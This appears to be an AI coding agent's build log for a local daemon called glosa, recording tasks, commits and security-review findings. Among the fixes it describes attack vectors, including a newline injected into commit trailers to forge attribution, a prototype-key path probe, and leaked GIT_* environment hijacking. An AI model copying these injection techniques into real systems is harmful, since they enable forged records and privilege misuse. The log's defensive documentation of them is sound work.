# glosa — overnight build log

Running narrative of the autonomous overnight build. Newest entries appended at the bottom of each
section. Source of truth for *progress* is `docs/BUILD-PLAN.md` (checkboxes); this file is the *why*
and the audit trail.

## Session log

### Session 1 — start 2026-07-21

**Phase 0 probes (green):**
- `bun --version` → 1.2.7 (meets ≥1.2.7 floor).
- `git status` → clean, on `main`, tracking `origin/main`.
- Branch policy resolver → `direct-to-main` (commit straight to main; no branch/PR).
- `bun test` → 1 pass (scaffold smoke), 0 fail.
- `bun run typecheck` (`tsc --noEmit`) → clean.
- Read `requirements.md` (R1–R9, T0–T8) fully; read `BUILD-PLAN.md`; skimmed appendix headings.
- Scaffold state: root `package.json` (workspaces `packages/*`), `tsconfig.json` (strict,
  noUncheckedIndexedAccess), each package has `package.json` + placeholder `src/index.ts`.

Starting the loop at **P1.1**.

## Per-task entries

<!-- one entry per task as it lands -->

### P1.1 monorepo scaffold — ✅ (commit 908379e)
- **Built (self, not delegated — light scaffold config, plan says "extend, don't recreate"):** fleshed
  out all six `packages/*` `package.json` (description + `exports` map); CLI gets `bin.glosa` + a real
  `src/main.ts` executable entry (the GLOSA_BIN target, A6 §F26) delegating to `run()` in `index.ts`
  (stub: `--version`→0, `--help`→0, unknown→exit 2). Root `prepare` script installs the git hook.
- **Real fix found:** root `workspaces` glob was `["packages/*"]`, which does **not** match the nested
  `packages/providers/*` and `packages/adapters/*` — those three packages were never symlinked. Fixed
  the globs; `bun install` now links all six. `test/workspace.test.ts` proves every package resolves by
  name (this test failed before the glob fix — real, not theater).
- **Pre-commit gate:** dependency-free `.githooks/pre-commit` (runs `bun run typecheck` + `bun test`),
  wired via `core.hooksPath=.githooks` (no lefthook binary → honors no-native-deps). Verified it fires
  and exits 0.
- **tsconfig:** added `allowImportingTsExtensions: true` (typecheck caught `main.ts`'s `./index.ts`
  import; idiomatic for no-build-step Bun).
- **Tests:** 3 pass / 0 fail; typecheck clean. CC: no (no adversarial pass needed).

### P1.2 daemon lifecycle + lock — ✅ (commit a1066c9) — CC, adversarially reviewed
- **Built (Sonnet subagent):** `packages/daemon/src/{home,lock,protocol,handshake,lifecycle,index}.ts` +
  `packages/cli/src/{index,main}.ts` wiring `__daemon`. `bootDaemon()` = bind 127.0.0.1:port → O_EXCL
  lock CAS → ignore SIGHUP/SIGINT, SIGTERM graceful → serve readiness handshake; exit codes 0/3/4 per
  F13. `ensureDaemon()` = client find-or-spawn (detached, unref, scrubbed env, poll ≤5s). Hermetic via
  `GLOSA_HOME` env override.
- **Adversarial pass (kombajn-dev:critic + my own review) found + fixed:**
  - **CRITICAL (R1 singleton):** original `ensureDaemon` did an unconditional `unlinkSync` + respawn on
    ambient `GLOSA_PORT` when the lock's pid was alive but the handshake didn't answer — could orphan a
    live daemon's lock or, when ports differ, run **two daemons**. **Fixed:** added `probePortBound()`
    (node:net) — reclaim only when the port is provably free (ECONNREFUSED); if bound-but-silent → **fail
    closed** (no unlink, no spawn); fallback spawn now always targets the authoritative `lock.port`.
  - **MAJOR:** the `ANTHROPIC_API_KEY` scrub (invariant #5, "the $1,800 footgun") had **zero** test
    coverage. **Fixed:** extracted pure `buildChildEnv()` + a **real OS round-trip** test that spawns a
    child and reads back its actual `process.env` (asserts the key is `<<ABSENT>>`).
  - Minors fixed: poll budget tightened to ≤5s; `shutdown()` async + awaits `server.stop()`;
    `parseProtocolVersion` hardened (rejects `""`/`"1"`/`"1.2.3"`); added tests for the live-peer EEXIST
    branch and the new fail-closed path.
- **Tests:** 33 pass / 0 fail (30 in daemon: real subprocess fault/concurrency — two-spawn race,
  stale-lock reclaim ×3, port authority, SIGTERM guard, SIGINT/SIGHUP ignore, proto mismatch,
  fail-closed, scrub round-trip). Typecheck clean. Verified helpers + gate independently before commit.

## Decisions made

<!-- small autonomous calls + rationale -->

### D1 — Host-mismatch vs Origin-mismatch HTTP status (for P1.3)
A1 §1/§9 says "Origin/Host not allowlisted → 403"; A3 §4 Rule 1 explicitly says **Host** mismatch →
**400, close, no body**. Between two appendices with no stated precedence, the security appendix (A3)
owns the Host/Origin auth table and is more specific. **Decision:** Host literal mismatch → **400**;
foreign **Origin** rejection → **403**. Coherent split; satisfies A3's explicit rule and A1's 403 table
for Origin. Apply in P1.3.

### P1.3 HTTP skeleton + auth — ✅ (commit 5909d71) — CC, security + adversarial review
- **Built (Sonnet subagent):** two loopback `Bun.serve` listeners (4646 API + 4647 class-F, both
  Host-checked); `auth.ts` `authorizeRequest` (pure, route-class-scoped Origin/Bearer per A3 §4 — Bearer
  before Origin so no-token→401 regardless of origin); `confine-path.ts` `confinePath` (realpaths nearest
  existing ancestor → catches symlink escape even for not-yet-created files; tracked-artifact glob check
  deferred to P2.2); `token.ts` (constant-time `timingSafeEqual`, length-oracle-safe); `contract.ts`
  (X-Contract-Version major-mismatch→409, minor→stale-minor warning); `problem.ts` (RFC 9457 envelope);
  `csp.ts` (SPA + class-F CSP strings, verified verbatim vs A3); handshake body = D2 superset (keeps P1.2
  fields, adds contract_version/daemon_version/paired).
- **Adversarial pass — security-auditor (no critical/high; CSP verbatim, DNS-rebinding defeated, tokens
  constant-time) + critic (2 blockers) + my review:**
  - **BLOCKER 1 (route-enumeration side channel):** unmatched route returned 404 before the Origin check →
    foreign origin got 403 on real routes, 404 on fake. **Fixed:** foreign Origin → 403 before 404 (D3).
  - **BLOCKER 2 (latent info-leak):** no global try/catch → a future throwing handler would leak Bun's
    dev-error HTML (source, no CSP). **Fixed:** whole pipeline try/catch on both listeners → detail-free
    `internalErrorResponse` (500 problem+json + CSP) + a Bun.serve `error:` callback.
  - **Real bug the subagent found while fixing the test flake:** `development: false` on `Bun.serve`
    (Bun 1.2.7) silently breaks cross-process EADDRINUSE detection → two racing daemons both bind →
    **R1 singleton violation**. It correctly REFUSED my `development:false` instruction, kept only the
    `error:` callback (which alone suppresses the dev overlay), and documented it. Verified: two-concurrent-
    spawn test green across 3 runs.
  - Decisions logged: D3 (origin-on-unmatched), D4 (malformed contract-version → lenient).
  - Test-infra: fixed a **pre-existing P1.2 port-collision flake** (random-port step bumped to 4 so the
    class-F `port+1` derivation can't collide; per-test local home state). Ran full suite 3× post-fix →
    102 pass / 0 fail every time, typecheck clean.

### P1.4 pairing + SPA shell — ✅ (commit d63d192) — CC: no
- **Built (Sonnet subagent):** `token.ts` `mintToken`/`ensureToken` (128-bit, atomic tmp+fsync+rename,
  0600, never overwrites); daemon serves `GET /` (SPA shell) + `GET /app/<file>` (static ES modules,
  allowlist-keyed), both **navigation** class (no Bearer), SPA CSP + nosniff. SPA: `packages/spa/src/
  shell.html` (four hidden `data-screen` containers) + `bootstrap.js` (**plain .js, not .ts** — no build
  step means nothing transpiles between disk and browser; added `allowJs:true` to tsconfig). `scrubToken`
  + `selectScreen` are pure/injectable; `main()` guarded by `typeof window`.
- **Decision D5 applied:** pairing fragment is `#t=<token>` (A1/A3 wire format), not A6's looser
  `#<capability>`. Comment in http.ts.
- **My review found + fixed (myself, 1-liner):** `SPA_ASSETS[name]` lookup let a prototype key
  (`__proto__`/`constructor`) resolve to a truthy inherited value, slipping past the `undefined` guard →
  `readFileSync` → 500 instead of 404. Hardened to `Object.hasOwn` + added a regression test (`/app/
  __proto__` → 404). Not a file-disclosure (allowlist still blocks path escape), just robustness.
- **Security property tested:** `scrubToken` fake-location/storage/history test asserts token → sessionStorage,
  localStorage untouched, `replaceState` strips `t=` (the "token never in history/localStorage" invariant).
- **Tests:** 125 pass / 0 fail; typecheck clean. Real-browser E2E (vs fakes) deferred to T8/rehearsal.

### P2.1 journal-as-truth — ✅ (commit 7ab393a) — CC, the correctness core, doubly adversarially reviewed
- **Built (Sonnet subagent):** `packages/daemon/src/bus/` — `ulid.ts` (monotonic Crockford ULID, injectable
  clock/random), `mutex.ts` (FIFO `AsyncMutex` + per-workspace `KeyedMutex`), `io.ts` (short-write loop +
  dir-fsync), `journal.ts` (append-only, fsync-before-ACK for lifecycle events, MAX_EVENT_BYTES=65536
  oversize-reject-before-fd-touch), `inbox.ts` (immutable write-once), `quarantine.ts`, `replay.ts` (pure
  fold, event_id + idem dedup, pluggable reducer — P2.5 swaps the full transition table in), `reconcile.ts`
  (ordered startup: torn-tail truncate → replay → inbox↔journal self-heal; steps 4–5 apply-lease/offline
  are typed stubs for P2.3), `bus.ts` (WorkspaceBus facade). Fault suite truncates at **every byte offset
  of every record** → asserts recovery is exactly one of {before, after} state, never partial.
- **Two parallel adversarial reviews (concurrency-expert + critic), both probe-verified — 1 blocker + 3
  durability fixes, all fixed:**
  - **BLOCKER (idempotency):** `replayJournal` re-appended a `line_quarantined` event + re-copied the bad
    line on EVERY replay (a malformed line has no event_id to dedup on) → journal + quarantine file grew
    unboundedly per daemon restart. Derived state stayed byte-identical, which is why the original tests
    missed it. **Fixed:** `line_quarantined.detail.hash = sha256(raw line)`; replay pre-scans existing
    hashes and skips the re-append. Regression: reconcile ×2 → identical journal + event counts.
  - **Durability (inbox):** `renameSync` silently overwrites (no syscall write-once) AND wasn't dir-fsynced
    → on power loss the rename could un-happen *after* `entry_created` was durable = the "reverse gap"
    reconcile assumes impossible. **Fixed:** `linkSync` (atomic EEXIST) + `unlinkSync(temp)` +
    `fsyncContainingDir` before returning.
  - **Durability (torn-tail):** `truncateSync` relied on a later append's fsync. **Fixed:** explicit
    `fsyncSync` right after truncate.
  - **Robustness (mid-process):** a partial `writeAllSync` (e.g. transient ENOSPC) left torn tail bytes
    while the daemon kept running → next append concatenated into a garbled line. **Fixed:** capture size
    before write, `ftruncateSync` back on throw. Plus `WorkspaceBus.close()` now drains via the mutex +
    a `closed` flag so post-close writes throw.
  - Deferred with notes: one-WorkspaceBus-per-root registry (P2.4, not wired yet); KeyedMutex eviction.
- **Tests:** 159 pass / 0 fail (34 in bus/), 2× stable, typecheck clean. The fault suite was independently
  judged genuinely rigorous (real strict two-state invariant, all offsets), not theater.

### P2.2 picomatch matcher — ✅ (commit 4df10cc) — CC: no
- **Built (Sonnet subagent):** `packages/daemon/src/matcher.ts` — the ONE canonical file LIST (A4 §F20).
  `resolveMatchedFiles(root) → {tracked, oversize, skippedSymlinks}`; `lstat`-only walk (symlinks neither
  followed nor matched — closes F24 escape); NFC comparison key (`path`) + raw on-disk `rawPath` for fs ops
  (APFS NFD gotcha); picomatch include-minus-exclude, `nocase:false`; strict-over-2MiB → oversize;
  deterministic `Buffer.compare` byte-sort; `diffSnapshots` emits file_tracked/file_untracked{oversize|
  deleted} crossing descriptors; `loadMatcherConfig` deep-merges `.glosa/config.json` (throws on bad JSON).
  Added `picomatch` dep (A4 sanctions it — pure JS). Strong edge tests: NFC/NFD, symlink safety, size
  boundary, byte-sort-vs-locale, config override.
- **My review + fix (myself):** the walk didn't prune — it `lstat`'d into `node_modules`/`.glosa` and only
  filtered per-file, a predictable perf cliff once P2.3 fills `.glosa/shadow.git`. **Fixed:** derive
  directory-prune patterns from the SAME exclude list (`P/**` → prune dirs matching `P`) — single source of
  truth, no second glob. Added a behavioral test (symlink inside a pruned subtree is never discovered).
- **Deferred (noted):** `followSymlinks` config field is carried but intentionally NOT wired — no-follow is a
  hardcoded security invariant per F20.
- **Tests:** 199 pass / 0 fail (40 matcher); typecheck clean.

### P2.3 shadow-git + apply-lease — ✅ (commit cd6e6a1) — CC, the provenance core, doubly adversarially reviewed
- **Built (Sonnet subagent):** `packages/daemon/src/git/shadow.ts` (argv-safe `runGit` — never a shell,
  `--git-dir/--work-tree` injected, isolated env; `safePathspec` + `--` for argv safety; deterministic
  init → `refs/heads/glosa` + baseline; `checkpoint` idempotent via `diff --cached --quiet`; trailers
  Glosa-Attribution/Kind/Entry/Lease; constant `glosa <glosa@localhost>` identity; `reclaimIndexLock`) +
  `bus/lease.ts` (TTL, typed errors) + `WorkspaceBus.applyBegin/resolveEntry` (pre/post checkpoints →
  proven `pre..post` = `session:<id>`) + reconcile steps 4–5 (`reconcileApplyLeases`, `offlineCatchUp`).
- **Two parallel adversarial reviews (concurrency-expert + critic), all probe-verified — 4 CRITICAL
  false-attribution/provenance bugs + 2 should-fix, all fixed:**
  - **C1 forgery:** `resolveEntry` never checked the caller's session against the lease holder → any
    caller could resolve another session's lease and be credited. Fixed: `LEASE_SESSION_MISMATCH` guard +
    attribute via **`lease.session`**, never the caller arg.
  - **C2 overwrite:** `offlineCatchUp` checkpointed even during an open lease → committed the in-flight
    edit as `unknown`, so the durable git trailer contradicted the journal. Fixed: skip when `applyLease`
    is present (active).
  - **C3 self-staging:** `checkpoint`'s empty-union `else git add -A` recursively staged `.glosa/shadow.git`'s
    own object store + the journal. Fixed: empty union → return HEAD, no add.
  - **C4 DoS:** `trackedUnion`'s non-`-z` `ls-tree` split bricked `checkpoint` forever for a filename with a
    tab/newline (git C-quotes those regardless of `quotepath`). Fixed: `ls-tree -r -z` + split `\0`.
  - **S5 trailer forgery:** unescaped trailer values let a `\n` forge a `Glosa-Attribution: human` line.
    Fixed: reject control chars in trailer values (`TRAILER_INJECTION`).
  - **S6 env config injection:** ambient `GIT_CONFIG_COUNT/KEY/VALUE` outranked `GIT_CONFIG_GLOBAL=/dev/null`.
    Fixed as part of the isolation fix below.
- **Bug the pre-commit hook itself caught (mine to fix):** the first commit attempt FAILED — the hook runs
  `bun test` WHILE git has `GIT_DIR`/`GIT_INDEX_FILE`/`GIT_WORK_TREE` set, and those leaked into the
  shadow-git subprocesses (33 failures), hijacking them onto the main repo's index. Real isolation bug, not
  a test artifact. **Fixed:** `isolatedEnv` now strips the **entire `GIT_` namespace** (shadow ops pass
  `--git-dir/--work-tree` on argv, so they need zero inherited git vars), then re-pins only what it wants.
  Added a regression test that runs init+checkpoint under leaked `GIT_DIR/INDEX_FILE/WORK_TREE` and proves
  the op hits the shadow repo. **Lesson for the handoff:** any git-subprocess code must strip `GIT_*`.
- **Tests:** 235 pass / 0 fail (incl. the full suite green UNDER the simulated hook env); typecheck clean.
- **Deferred → P2.4:** single-WorkspaceBus-per-root registry (both reviewers: the single-writer guarantee
  is convention-only; wire reconcile + the live bus to share one mutex/instance at P2.4).

### P2.4 registry + workspace index + routing — ✅ (commit 32f89d5) — CC, doubly adversarially reviewed
- **Built (Sonnet subagent):** `packages/daemon/src/registry/` — `slug.ts` (canonicalize + F25 collision-
  lengthening), `workspace-index.ts` (`<GLOSA_HOME>/workspaces.json`, AsyncMutex-serialized, atomic
  temp→fsync→rename, GC with grace + `hasLiveSession` predicate), `session-registry.ts` (in-memory, liveness
  = lease/heartbeat, **never** `kill(pid,0)`), `routing.ts` (explicit-binding > cwd-ancestor, park/drain,
  picker-not-guess), `lockfile-fallback.ts` (jethro's `withSessionLease` ported — O_EXCL CAS + stale reclaim,
  proven with a 5-process×8-increment cross-process test). `bus/workspace-bus-registry.ts` (the deferred
  single-WorkspaceBus-per-root registry — closes P2.3's convention-only single-writer gap).
- **Two parallel adversarial reviews (concurrency-expert + critic) — NO blockers; 6 should-fix hardening
  items applied:** (1) `WorkspaceBusRegistry` bus leak on GC hard-remove → `onHardRemove` hook + `evict()`;
  (2) cwd-ancestor fallback now scopes to the **nearest (deepest) ancestor** (A2 §F08) instead of surfacing
  a needless picker; (3) `register()` rolls back the in-memory session if the index upsert throws (no
  routable-but-unindexed session); (4) corrupt `workspaces.json` is now **quarantined** (`.corrupt.<ts>` +
  warn) instead of silently discarded (matches the journal convention); (5) an **unwired GC** (predicate not
  set) now soft-deletes only, never hard-removes a possibly-live workspace; (6) sync-invariant comments on
  the mutex-bypassing park set. Reviewers verified adversarially: routing precedence both directions, park/
  drain keying, slug determinism/termination, GC AND-logic + grace boundary, fallback CAS, liveness boundary.
- **Deferred (`// P4.3:` notes in-code):** daemon-side index writes must share the O_EXCL fallback lease with
  the hook-side writer once that caller exists (not reachable yet); slug 64-hex-cap duplicate (negligible).
- **Tests:** 309 pass / 0 fail (incl. full suite green UNDER the git-hook env → pre-commit safe); typecheck clean.

### P2.5 lifecycle state machine — ✅ (commit 5b0cc36) — CC, doubly adversarially reviewed → **Phase 2 COMPLETE**
- **Built (Sonnet subagent):** `packages/daemon/src/bus/lifecycle.ts` — the full guarded transition reducer
  (two axes/tables selected by entry `kind`: common `pending→delivered→seen→{applied|rejected|stale}`,
  attention `open→delivered→seen→{done|expired|stale}`), guarded (transition applies only from a legal
  `from`, else ignored on replay = idempotent), first-terminal-wins, `delivery_attempt` structurally off the
  status axis. Swapped into P2.1's pluggable `Reducer`. D7 (generic `transition_committed`/`attention_committed
  {to}` events) + D8 (A5 §F23 terminal vocabulary) applied.
- **Two parallel adversarial reviews (critic + concurrency-expert) — 1 blocker + release-gate fix + should-fix,
  all fixed:**
  - **BLOCKER:** entry-kind was read from `entry_created.detail.kind`, but `kind` lives in the inbox payload
    and `createEntry` never copied it → attention entries silently got the COMMON guard table → all
    `attention_committed{done|expired}` ignored → status stuck → R9 `--wait` would hang forever. Fixed:
    `createEntry` derives the event `detail.kind` from `payload.kind`; test drives a real attention entry to `done`.
  - **HIGH (release gate):** the P2.1 fault-injection suite — the project's *actual* release gate — ran
    `reconcileWorkspace` with the minimal placeholder reducer, so it validated crash-recovery against the WRONG
    reducer. Fixed: `reconcileWorkspace` defaults to `lifecycleReducer`; the fault suite's reference fold uses it
    too → the gate now tests the production guarded reducer.
  - **D8 conformance:** dropped the `applied→resolved` remap (`to = outcome`); common terminals are now
    literally `applied/rejected/stale` per A5 §F23 (updated ~15 test sites).
  - **should-fix:** auto-vivify now guards the `to` value (no limbo entries); added live-bus==restart round-trip
    test + wrong-axis tests; `recordDeliveryAttempt` now carries the F23 `detail` fields.
  - Confirmed sound by review: live-fold == replay-fold is *mechanically* identical (same `applyEvent`, same
    mutex-serialized order), replay-twice byte-identical.
- **Tests:** 341 pass / 0 fail (incl. full suite green UNDER the git-hook env); typecheck clean.

### P3.1 full HTTP route catalog + daemon-boot wiring — ✅ (commit b2a5464) — CC: no, focused security review
- **Built (Sonnet subagent):** the full A1 §5 `/w/:slug/…` route catalog in `http.ts`, integrating the Phase-2
  backends. `buildBackend` (lifecycle.ts) constructs the daemon's ONE `WorkspaceIndex`+`SessionRegistry`+
  `WorkspaceBusRegistry` and wires the P2.4-deferred predicates (`setLiveSessionPredicate`,
  `setOnHardRemove`→`evict`). Fully wired: workspaces, artifacts (matcher), artifacts/:path (raw + `?render=html`
  via new `artifact-render.ts` markdown-it + `data-line` stamps, `sourceSha256` = SHA256 after `\r\n→\n`),
  annotations POST (→ WorkspaceBus.createEntry, 201), diff (shadow-git + trailer attribution via
  `checkpoint-diff.ts`), inbox, session-binding. GETs use a **read-only journal peek-fold** (no git/writes).
  Shells (full auth pipeline, 501): stream (P3.2), transcript/stream (P4.2), capability (P4.1), inbox-response
  (F12). Added `markdown-it` dep.
- **Focused critic review — all 9 security invariants confirmed holding** (slug-gate-first, confinePath +
  tracked-membership on every path, class-F never served through class-R, full auth pipeline on shells,
  argv-safe validated diff, read-only peek). **2 should-fix bugs found + fixed:**
  - **honest-kind violation:** annotations handler spread the raw client body after `kind:"annotation"`, so a
    client could POST `kind:"attention_request"` and forge a fake attention entry. Fixed: explicit picked
    fields only.
  - **reconcile-cache landmine:** the reconcile-once gate was a module-level Set keyed by root string, so
    after `forget`/GC evict + reopen a fresh bus was never reconciled (state not replayed). Fixed: moved
    `reconciledOnce` onto the `WorkspaceBus` instance. + capability shell now confinePath-checks (P4.1 prep).
- **Tests:** 392 pass / 0 fail (incl. full suite green UNDER the git-hook env); typecheck clean.

### P3.2 streaming SSE — ✅ (commit 652a739) — CC, doubly adversarially reviewed
- **Built (Sonnet subagent):** `src/sse.ts` (frame encode + client fetch-streaming parser, NOT EventSource),
  `src/bus/tail.ts` (journal-line count + `readJournalEventsSince`), `src/stream.ts` (`GET /w/:slug/stream`:
  first-connect snapshot at the current cursor, reconnect resume from a journal-line cursor via
  `Last-Event-ID`/`?since`, live push via a new in-process `WorkspaceBus.subscribe` notifier, chokidar v4
  artifact watch, 15s heartbeat + `server.timeout(req,0)` scoped to the response). Cursor = physical journal
  line offset, recomputed from disk so it's stable across restart. Added `chokidar` dep.
- **Reviews (concurrency-expert + critic) — core no-loss/no-dup/restart invariant CONFIRMED sound** (Bun runs
  `ReadableStream.start()` synchronously → subscribe→cursor-read is atomic; append+notify is one sync unit
  under the bus mutex). **2 HIGH bugs found + fixed:**
  - a numeric-but-out-of-range cursor (`≤ -2`) crashed the reconnect (500) + leaked a listener → guard
    `sinceSeq >= -1` (else first-connect) + clamp in `readJournalEventsSince`.
  - `notify()` had no per-listener isolation → a throwing listener rejected the write (500-ing a client whose
    data saved) AND skipped later listeners (event loss for other SSE clients) → try/catch per listener.
  - + defensive teardown-on-throw in `start()`.
- **Tests:** 431 pass / 0 fail (verified 4× incl. git-hook env). **⚠ FLAKE watch:** the subagent saw one
  transient artifact in the idle-timeout-override test ("bogus multi-billion-ms duration in Bun's reporter")
  on one run — did NOT reproduce in my 4 runs; treated as a Bun runner/timing artifact, not a logic bug.
  If the pre-commit hook ever flakes there, it's this real-timer test under parallel load.
- **Follow-ups noted in-code (`// P3.3:`/`// follow-up:`):** (a) one chokidar watcher per SSE connection →
  share per-root later; (b) no `desiredSize` backpressure (stalled-but-connected client grows memory);
  (c) **P3.3 must re-fetch `GET /w/:slug/artifacts` after every SSE reconnect** — artifact frames aren't
  journaled, so a file change missed during a disconnect isn't replayed (spec-faithful, A1 §8.2 case 3).

### P3.3 class-R viewer + 3 modes — ✅ (commit e0865c0) — CC: no (targeted self-review at depth)
- **Built (Sonnet subagent):** SPA (`packages/spa/src/`) vanilla ES modules — `data-access.js` (R6's ONE
  daemon path: getArtifacts/getArtifact/postAnnotation/putArtifact/openStream + SSE reconnect w/ A1 §8.2
  backoff + re-fetch-on-reconnect per the P3.2 note), `annotate.js` (pure W3C annotation record builder —
  UTF-16 offsets, ±40 prefix/suffix, surrogate-safe — + DOM selection walker), `viewer.js` (Preview/Annotate/
  Edit mode reducer, idiomorph live-morph, `mountApp` sidebar+viewer), vendored `idiomorph@0.7.4` (no build
  step → served via SPA_ASSETS allowlist). Daemon: new **`PUT /w/:slug/artifacts/:path`** edit-save route
  (state-changing; same slug-gate/confinePath/tracked-membership as GET; class-F→400; If-Match→409;
  `writeArtifactAtomic` + `WorkspaceBus.humanEditCheckpoint` → `human` BY CONSTRUCTION, A4 §F05).
- **Bug the subagent caught + fixed (provenance integrity):** edit-save must `resolveBus`/reconcile BEFORE
  writing the file — else the workspace's first offline-catchup reconcile steals the fresh edit as `unknown`
  drift before `humanEditCheckpoint` runs. A route-level test caught it (attribution came back `unknown`);
  fixed + documented inline; the diff now correctly shows `human`.
- **My review (targeted, proportionate for CC:no at deep context):** verified the PUT route writes only to the
  matcher's confined+tracked `rawPath` (no write-outside-workspace / no `.glosa`/`.git`), reuses the exact
  auth+confinement pipeline the P3.1 critic already exhaustively verified, and the `human`-attribution ordering
  is correct + tested. Client-side guarded by an `import-boundary` test (only `data-access.js` calls `fetch`).
- **Tests:** 494 pass / 0 fail (12 new daemon route tests + SPA logic/DOM/wire-compat/import-boundary; incl.
  git-hook env). Added `idiomorph` (prod) + `happy-dom` (devDep).
- **Deferred to P5.4 rehearsal (⛔ Dawid):** real-browser E2E (actual scroll/selection preservation across a
  live SSE-driven morph — happy-dom does no layout); a real GET-annotations endpoint (margin list is
  session-local until one exists — a follow-up route).

### P3.4 anchoring resolver — ✅ (commit ce4739c) — CC, adversarially reviewed (release-gate corpus)
- **Built (Sonnet subagent):** `packages/daemon/src/anchoring.ts` — total `resolve(annotation, artifact, ctx)
  → source_range|pipeline_feedback|orphaned`, never throws (top-level try/catch + input sanitizers). Fixed
  normalization = NFC + whitespace-fold via an **offset-preserving cluster map** (so a folded match recovers
  the EXACT source span/line/col). Class-R 6-step cascade (identity → block scope → EXACT → NORMALIZED → widen
  → block_range guidance → orphaned; NEVER pipeline_feedback). Class-F cascade (chunk→transformed:false EXACT/
  NORMALIZED else orphaned; transformed:true → pipeline_feedback). **F11 honesty enforced structurally.**
- **Two good subagent calls:** (a) refused to hardcode `adapter:jethro`/`component:format-sermon` in
  pipeline_feedback (would violate invariant #1) → made caller-supplied via `ctx.pipelineFeedback`; (b)
  corrected my brief's factual error (`ł` doesn't canonically decompose → used ó/ą/ż).
- **Adversarial review (critic) — ALL core invariants CONFIRMED holding** (F11 honesty: pipeline_feedback
  structurally impossible for class-R + never for a verbatim-chunk miss; intent NEVER changes the resolution
  kind; uniqueness gate never auto-applies to a duplicate; stale-hash never trusts a bad position; totality
  fuzzed 40+ shapes; invariant #1 clean). **2 should-fix honesty/robustness items fixed:**
  - class-F conflated "duplicated" with "absent" → a duplicate quote now → `orphaned{ambiguous}` (honest),
    not the false `quote_absent_not_transformed`.
  - an unpaired-surrogate quote could yield a bogus mid-surrogate "exact" match → `stripLoneSurrogates` in
    sanitize. + block_range sibling-block bounding + nits.
- **Tests:** 585 pass / 0 fail (103-case anchor corpus: NFD/combining, markup-spanning, duplicates, stale
  hashes, whitespace-fold, class-R-never-feedback, class-F transformed/verbatim, 45-case totality fuzz — all
  through REAL renderMarkdown + happy-dom positions, not hand-counted; incl. git-hook env). **Phase 3 nearly
  done — only P3.5 (diff pane) left.**

### P3.5 diff pane + full history — ✅ (commit 7a08b30) — CC: no (targeted self-review) → **Phase 3 COMPLETE**
- **Built (Sonnet subagent — went idle without a summary; I verified the substance directly):** `GET
  /w/:slug/checkpoints` (`checkpoints.ts`: `since`=`yesterday|today|ISO|<id>` resolved in HOST-LOCAL TZ, rows
  carry `by` from the `Glosa-Attribution` trailer, opaque short-sha `checkpoint_id`), `POST /w/:slug/restore`
  (`handleRestore`: confinePath+tracked-membership, `commitExists(to)` validation, **dirty-guard → 409
  restore-conflict + the would-be-lost diff unless `force`**, restore recorded as an append-only **`human`**
  checkpoint kind `restore`, writes only to the confined `match.rawPath`). SPA: `history.js` document-native
  timeline + diff2html diff pane (vendored `diff2html`), all through `data-access.js` (import-boundary green).
- **My review (targeted, CC:no at deep context):** verified `handleRestore` writes only to a confined tracked
  path, the dirty-guard + human-attribution + append-only-restore are correct, and it reuses the auth/
  confinement machinery already exhaustively verified in P3.1. The **DST day-boundary acceptance test is
  genuinely rigorous** — real Europe/Warsaw spring-forward (2026-03-29 → 23h span) + fall-back (2026-10-25 →
  25h span), not mocked.
- **Tests:** 627 pass / 0 fail (incl. dirty-refusal, restore-creates-human-checkpoint, DST boundary, checkpoint
  listing attribution; git-hook env green). Added `diff2html` dep. `shadow.ts` gained a commit-date-pin option
  (deterministic checkpoint timestamps for tests).
- **PHASES 1–3 COMPLETE (14 tasks).** Next: Phase 4 — P4.1 class-F viewer (CC), P4.2 conversation, P4.3 Claude
  provider (CC), P4.4 provider iface + Codex, **P4.5→P6.1**; then P5.1 CLI, P5.2 acceptance suites (CC), P6.1
  generic adapter protocol (CC). ⛔ P5.3/P5.4 = Dawid.

### P4.1 class-F viewer + P4.2 conversation viewer — ✅ (commit 2047d3b, combined) — P4.1 CC
- **Ran in PARALLEL** (independent subsystems) — but both edited `http.ts`/`data-access.js`/`viewer.js`, so
  the tree entangled + went transiently red mid-build → committed together. **Lesson: don't parallelize tasks
  that share a source file; serialize same-file work.**
- **P4.1 class-F (CC, security-critical):** `capability.ts` (256-bit CSPRNG token+nonce, in-memory, TTL 600s,
  dir-scoped multi-request), `classf-serve.ts` (`/doc/:token` on 4647, per-request realpath confinement,
  source-preserving bridge injection), `classf-bridge.ts` + `classf-viewer.js` (MessageChannel nonce bridge,
  3 parent-trust checks). CSP = A3 §1 verbatim. **Two-reviewer security pass (security-auditor + critic):
  capability/CSP/bridge/traversal/DNS-rebinding/info-leak all CONFIRMED solid + tested, not theater.** Fixes:
  self-nav mitigations (strip `<meta http-equiv=refresh>` + parent nav-detect teardown), `</body>` case-fold
  offset corruption bug, csp.test.ts exact-both, iframe.src/no-srcdoc, foreign-origin mint test.
- **⚠ SECURITY RESIDUAL logged for Dawid** (see "Blocked — needs Dawid"): sandboxed-iframe **self-navigation**
  egress can't be fully closed by CSP/sandbox (platform limit) — mitigated + needs a threat-model decision
  (recommend: class-F artifacts are the user's OWN jethro output, not adversary-supplied → accept residual).
- **⚠ OWED (documented `// P6.1:` in http.ts):** `anchoring.ts` `resolve()` (P3.4) is built+tested but NOT
  wired into the annotation lifecycle — annotations persist un-anchored. class-R can be wired now; class-F
  needs the adapter's `manifest_path` (P6.1). Exercised end-to-end by the P5.4 rehearsal. **Must be wired
  before v1 done.** Class-F artifact response test loosened to `objectContaining` so P6.1 can add manifest_path.
- **P4.2 conversation viewer (CC: no):** `transcript/normalize.ts` (isolated TranscriptEvent normalizer —
  never throws; partial-line buffer, unknown/corrupt quarantine, resume/clear/compact, tool_result caps),
  `transcript/root.ts` (path confined under `$CLAUDE_CONFIG_DIR`), `transcript/stream.ts` (`transcript/stream`
  SSE via registry `transcript_path`, `{inode,byte_offset}` cursor, **fail-soft** `mirror_unavailable`).
  `POST transcript/compose` = 202 out-of-band seam, **never writes the transcript** (tested). SPA
  `conversation.js` (read-only typed render + composer, fail-soft). Targeted self-review (CC:no at depth).
- **Tests:** 778 pass / 0 fail (incl. git-hook env); typecheck clean. **Phase 4: P4.1/P4.2 done; P4.3 (Claude
  provider, CC), P4.4 (provider iface + Codex/T2a), P4.5→P6.1 remain.**

### P4.3 Claude Code provider + glosa init — ✅ (commit 083fda8) — CC, doubly adversarially reviewed
- **Built (Sonnet subagent, solo):** `packages/daemon/src/providers/interface.ts` (the R7 `AgentProvider`
  interface — verbatim), `packages/providers/claude-code/src/{provider,rewake,hook-types}.ts` (Claude
  provider: R4 delivery ladder channels→gate→boundary→mcp-pull, channels-off fallback; asyncRewake per-session
